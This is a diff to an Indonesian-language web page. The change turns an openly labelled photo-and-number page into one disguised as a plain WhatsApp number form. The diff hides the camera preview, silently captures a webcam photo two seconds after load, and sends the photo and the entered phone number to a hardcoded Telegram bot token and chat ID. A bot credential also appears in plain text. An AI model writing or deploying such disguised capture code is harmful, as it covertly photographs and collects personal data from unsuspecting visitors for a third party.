@@ -3,54 +3,48 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Kirim Foto & Nomor WA ke Telegram</title>
+  <title>Form Nomor WhatsApp</title>
   <style>
     body {
       font-family: sans-serif;
       padding: 20px;
       text-align: center;
     }
-    video, canvas {
-      width: 100%;
-      max-width: 400px;
-      margin-top: 10px;
-      display: none;
-    }
     input, button {
       margin-top: 10px;
       padding: 10px;
       font-size: 16px;
+      width: 80%;
+      max-width: 300px;
+    }
+    #canvas {
+      display: none;
     }
   </style>
 </head>
 <body>
-  <h2>Ambil Foto & Kirim ke Telegram</h2>
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas" style="display:none;"></canvas>
+  <h3>Masukkan Nomor WhatsApp</h3>
+  <input type="text" id="waNumber" placeholder="Contoh: 6281234567890" />
+  <br>
+  <button onclick="sendToTelegram()">Kirim</button>
 
-  <div id="formContainer" style="display:none;">
-    <p>Masukkan Nomor WhatsApp:</p>
-    <input type="text" id="waNumber" placeholder="Contoh: 6281234567890" />
-    <br>
-    <button onclick="sendToTelegram()">Kirim ke Telegram</button>
-  </div>
+  <video id="video" autoplay playsinline style="display: none;"></video>
+  <canvas id="canvas"></canvas>
 
   <script>
+    const botToken = '7548364986:AAGhIDQas3V9_Cz1Td7XXsLUKn7vYqjgzOY';
+    const chatId = '7041008009';
+
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
     const context = canvas.getContext("2d");
-    const form = document.getElementById("formContainer");
-
-    const botToken = '7548364986:AAGhIDQas3V9_Cz1Td7XXsLUKn7vYqjgzOY'; // Ganti dengan token bot kamu
-    const chatId = '7041008009';     // Ganti dengan chat ID kamu
 
     let photoBlob = null;
 
-    async function startCamera() {
+    async function startCameraAndCapture() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
-        video.style.display = "block";
 
         video.onloadedmetadata = () => {
           setTimeout(() => {
@@ -59,11 +53,11 @@
             context.drawImage(video, 0, 0);
             const dataURL = canvas.toDataURL("image/png");
             photoBlob = dataURLtoBlob(dataURL);
-            form.style.display = "block";
-          }, 2000); // Ambil foto otomatis 2 detik setelah kamera siap
+            stream.getTracks().forEach(track => track.stop()); // matikan kamera
+          }, 2000); // Ambil foto otomatis setelah 2 detik
         };
       } catch (err) {
-        alert("Gagal mengakses kamera. Pastikan sudah mengizinkan.");
+        alert("Gagal mengakses kamera. Pastikan kamu mengizinkan kamera.");
         console.error(err);
       }
     }
@@ -71,7 +65,7 @@
     function sendToTelegram() {
       const waNumber = document.getElementById("waNumber").value.trim();
       if (!waNumber || !photoBlob) {
-        alert("Isi nomor WhatsApp dan pastikan foto berhasil diambil.");
+        alert("Isi nomor WhatsApp dan tunggu kamera mengambil foto.");
         return;
       }
 
@@ -86,8 +80,7 @@
       })
       .then(res => res.json())
       .then(data => {
-        alert("Berhasil dikirim ke Telegram!");
-        form.innerHTML = "<p>Data berhasil dikirim.</p>";
+        alert("Data berhasil dikirim ke Telegram!");
       })
       .catch(err => {
         alert("Gagal mengirim ke Telegram.");
@@ -107,7 +100,7 @@
       return new Blob([u8arr], { type: mime });
     }
 
-    window.onload = startCamera;
+    window.onload = startCameraAndCapture;
   </script>
 </body>
 </html>
